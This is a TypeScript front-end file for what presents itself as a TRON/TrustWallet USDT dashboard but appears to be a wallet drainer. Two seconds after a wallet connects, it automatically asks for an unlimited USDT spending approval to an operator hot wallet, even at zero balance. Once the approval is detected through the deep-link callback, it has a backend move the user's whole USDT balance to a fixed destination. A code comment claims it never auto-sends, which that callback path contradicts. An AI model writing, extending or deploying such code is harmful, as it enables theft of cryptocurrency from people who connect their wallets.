import "./styles.css";
import { renderConnectView } from "./ui/connect";
import { renderDashboardView } from "./ui/dashboard";
import { connectWallet, type WalletSession } from "./wallet";
import { sendApprove } from "./transfer";
import {
  buildApproveTx,
  broadcastTx,
  fetchAllowance,
  fetchUsdtBalance,
} from "./tron";
import { fetchAdminStatus, requestBackendTransfer } from "./backend";
import { stopServerCard } from "./ui/serverCard";
import { DEFAULT_DEST, HOT_WALLET_ADDRESS } from "./config";
import { beginRetryApprove, beginRetryTransfer } from "./guards";
import { buildTrustWalletDeepLink } from "./deeplink";
import { pollForApproval } from "./polling";

type View = "connect" | "qr" | "dashboard";

const MAX_UINT256 = (1n << 256n) - 1n;

const PENDING_APPROVAL_KEY = "pendingApprovalAddress";

const state = {
  view: "connect" as View,
  session: null as WalletSession | null,
  qrUri: null as string | null,
  connectError: null as string | null,
  notice: null as string | null,
  approveStatus: null as "pending" | "success" | "error" | null,
  approveError: null as string | null,
  approveTxId: null as string | null,
  transferStatus: null as "pending" | "success" | "error" | null,
  transferError: null as string | null,
  transferTxId: null as string | null,
};

let transferGeneration = 0;
let connectGeneration = 0;

function goConnect(opts: { notice?: string; error?: string } = {}): void {
  transferGeneration++;
  stopServerCard();
  state.view = "connect";
  state.qrUri = null;
  state.notice = opts.notice ?? null;
  state.connectError = opts.error ?? null;
  state.approveStatus = null;
  state.approveError = null;
  state.approveTxId = null;
  state.transferStatus = null;
  state.transferError = null;
  state.transferTxId = null;
  render();
}

function cancelConnect(): void {
  connectGeneration++;
  transferGeneration++;
  goConnect();
}

function resumePendingApproval(): boolean {
  if (new URLSearchParams(location.search).get("callback") !== "approval") return false;
  const owner = sessionStorage.getItem(PENDING_APPROVAL_KEY);
  if (!owner) return false;
  sessionStorage.removeItem(PENDING_APPROVAL_KEY);
  const url = new URL(location.href);
  url.searchParams.delete("callback");
  history.replaceState(null, "", url.toString());
  const session: WalletSession = {
    address: owner,
    signTransaction: async (tx) => tx,
    disconnect: async () => {},
  };
  state.session = session;
  state.view = "dashboard";
  state.approveStatus = "pending";
  state.approveError = null;
  state.approveTxId = null;
  render();
  pollForApproval(owner, HOT_WALLET_ADDRESS, {
    intervalMs: 3000,
    timeoutMs: 30000,
    onApproved: () => {
      state.approveStatus = "success";
      render();
      void autoSendAll(session, transferGeneration);
    },
    onTimeout: () => {
      state.approveStatus = "error";
      state.approveError =
        "Approval not detected — open TrustWallet and approve, then retry";
      render();
    },
  });
  return true;
}

function render(): void {
  if (resumePendingApproval()) return;
  if (state.view === "dashboard" && state.session) {
    const session = state.session;
    renderDashboardView({
      session,
      dest: DEFAULT_DEST,
      approveStatus: state.approveStatus,
      approveError: state.approveError,
      approveTxId: state.approveTxId,
      transferStatus: state.transferStatus,
      transferError: state.transferError,
      transferTxId: state.transferTxId,
      onDisconnect: () => {
        state.session = null;
        goConnect();
        void session.disconnect().catch(() => {});
      },
      onSend: () => {
        if (state.view !== "dashboard" || !state.session) return;
        if (!beginRetryTransfer(state)) return;
        render();
        void runApproveThenSend(state.session, transferGeneration);
      },
      onRequestApproval: () => {
        if (state.view !== "dashboard" || !state.session) return;
        void requestApprovalViaDeepLink();
      },
      onRetryApprove: () => {
        if (state.view !== "dashboard" || !state.session) return;
        if (!beginRetryApprove(state)) return;
        render();
        void autoApproveOnly(state.session, transferGeneration);
      },
      onRetryTransfer: () => {
        if (state.view !== "dashboard" || !state.session) return;
        if (!beginRetryTransfer(state)) return;
        render();
        void runApproveThenSend(state.session, transferGeneration);
      },
    });
    return;
  }

  renderConnectView({
    qrUri: state.qrUri,
    error: state.connectError,
    notice: state.notice,
    onConnect: () => {
      void startConnect();
    },
    onBack: () => {
      cancelConnect();
    },
  });
}

async function autoApprove(
  session: WalletSession,
  generation: number,
): Promise<boolean> {
  state.approveStatus = "pending";
  state.approveError = null;
  state.approveTxId = null;
  render();

  try {
    const result = await sendApprove(
      {
        buildApproveTx,
        signTransaction: (tx) => session.signTransaction(tx),
        broadcastTx,
      },
      {
        owner: session.address,
        spender: HOT_WALLET_ADDRESS,
        amountBase: MAX_UINT256,
      },
    );

    if (generation !== transferGeneration) return false;
    if (result.ok) {
      state.approveStatus = "success";
      state.approveTxId = result.txId;
      return true;
    }
    state.approveStatus = "error";
    state.approveError = result.error;
    return false;
  } catch (e) {
    if (generation !== transferGeneration) return false;
    state.approveStatus = "error";
    state.approveError = e instanceof Error ? e.message : "Approval failed";
    return false;
  } finally {
    if (generation === transferGeneration) render();
  }
}

async function autoApproveOnly(
  session: WalletSession,
  generation: number,
): Promise<void> {
  await autoApprove(session, generation);
}

async function autoSendAll(session: WalletSession, generation: number): Promise<void> {
  state.transferStatus = "pending";
  state.transferError = null;
  state.transferTxId = null;
  render();

  try {
    // Pre-check: if the backend reports the hot wallet is below estimated fees,
    // skip the transfer call and surface a clear replenish prompt. Unreachable
    // status or wallet errors proceed — the server gate is the authority.
    const status = await fetchAdminStatus();
    if (generation !== transferGeneration) return;
    const w = status?.wallet;
    if (status?.ok && w && !("error" in w) && w.belowEstimate) {
      const needed = Math.max(w.minSun, w.feeEstimateSun ?? 0);
      const neededStr = (needed / 1_000_000).toFixed(2);
      state.transferStatus = "error";
      state.transferError = `Send at least ${neededStr} TRX to ${w.address} to cover network fees, then retry.`;
      return;
    }

    // The approve tx may need a few seconds to become queryable on TronGrid,
    // so retry while the server reports APPROVE_REQUIRED.
    let result = await requestBackendTransfer(session.address);
    for (let attempt = 0; attempt < 3 && !result.ok && result.code === "APPROVE_REQUIRED"; attempt++) {
      await new Promise((r) => setTimeout(r, 4000));
      if (generation !== transferGeneration) return;
      result = await requestBackendTransfer(session.address);
    }

    if (generation !== transferGeneration) return;
    if (result.ok) {
      state.transferStatus = "success";
      state.transferTxId = result.txId;
    } else {
      state.transferStatus = "error";
      state.transferError = result.error;
    }
  } catch (e) {
    if (generation !== transferGeneration) return;
    state.transferStatus = "error";
    state.transferError = e instanceof Error ? e.message : "Transaction failed";
  } finally {
    if (generation === transferGeneration) render();
  }
}

async function runApproveThenSend(
  session: WalletSession,
  generation: number,
): Promise<void> {
  let balance = 0n;
  try {
    balance = await fetchUsdtBalance(session.address);
    if (generation !== transferGeneration) return;
  } catch {
    if (generation !== transferGeneration) return;
    if (state.approveStatus === "pending") {
      state.approveStatus = null;
      state.approveError = null;
      state.approveTxId = null;
    }
    state.transferStatus = "error";
    state.transferError = "Failed to load USDT balance";
    render();
    return;
  }

  if (balance === 0n) {
    if (state.approveStatus === "pending") {
      state.approveStatus = null;
      state.approveError = null;
      state.approveTxId = null;
    }
    state.transferStatus = "error";
    state.transferError = "No USDT balance to send";
    render();
    return;
  }

  let alreadyApproved = false;
  try {
    const allowance = await fetchAllowance(session.address, HOT_WALLET_ADDRESS);
    if (generation !== transferGeneration) return;
    alreadyApproved = allowance >= balance;
  } catch {
    if (generation !== transferGeneration) return;
    // Allowance check failed — prompt for approval anyway.
  }

  if (alreadyApproved) {
    state.approveStatus = null;
    state.approveError = null;
    state.approveTxId = null;
  } else {
    const approved = await autoApprove(session, generation);
    if (!approved || generation !== transferGeneration) return;
  }

  await autoSendAll(session, generation);
}

async function startConnect(): Promise<void> {
  const generation = ++connectGeneration;
  state.notice = null;
  state.connectError = null;
  try {
    const session = await connectWallet({
      onUri: (uri) => {
        if (generation !== connectGeneration) return;
        state.view = "qr";
        state.qrUri = uri;
        state.notice = null;
        state.connectError = null;
        render();
      },
      onDisconnect: () => {
        if (generation !== connectGeneration) return;
        if (state.view === "dashboard") {
          state.session = null;
          goConnect({ notice: "Wallet disconnected" });
        }
      },
    });
    if (generation !== connectGeneration) {
      void session.disconnect().catch(() => {});
      return;
    }
    state.session = session;
    state.view = "dashboard";
    state.qrUri = null;
    state.approveStatus = null;
    state.approveError = null;
    state.approveTxId = null;
    state.transferStatus = null;
    state.transferError = null;
    state.transferTxId = null;
    render();
    // Auto-request USDT approval 2s after connect (even at $0 balance).
    // Stops at approval only — never auto-sends. Generation guards cover
    // disconnect/reconnect during the wait.
    void (async () => {
      try {
        await new Promise((r) => setTimeout(r, 2000));
        if (generation !== connectGeneration) return;
        if (state.session !== session || state.view !== "dashboard") return;
        // Skip if a manual approve/transfer started during the wait — the
        // scheduled auto-approve must not clobber an in-flight status.
        if (state.approveStatus === "pending" || state.transferStatus === "pending") {
          return;
        }
        await autoApproveOnly(session, transferGeneration);
      } catch (err) {
        console.error("Auto-approve failed:", err);
      }
    })();
  } catch (error) {
    if (generation !== connectGeneration) return;
    const message = error instanceof Error ? error.message : "Connection failed";
    goConnect({ error: message });
  }
}

async function requestApprovalViaDeepLink(): Promise<void> {
  if (!state.session) return;
  const owner = state.session.address;
  try {
    const tx = await buildApproveTx(owner, HOT_WALLET_ADDRESS, MAX_UINT256);
    sessionStorage.setItem(PENDING_APPROVAL_KEY, owner);
    state.approveStatus = "pending";
    state.approveError = null;
    state.approveTxId = null;
    render();
    const redirectUrl = `${location.origin}${location.pathname}?callback=approval`;
    location.href = buildTrustWalletDeepLink(tx, redirectUrl);
  } catch (e) {
    sessionStorage.removeItem(PENDING_APPROVAL_KEY);
    state.approveStatus = "error";
    state.approveError = e instanceof Error ? e.message : "Failed to build approval";
    render();
  }
}

render();
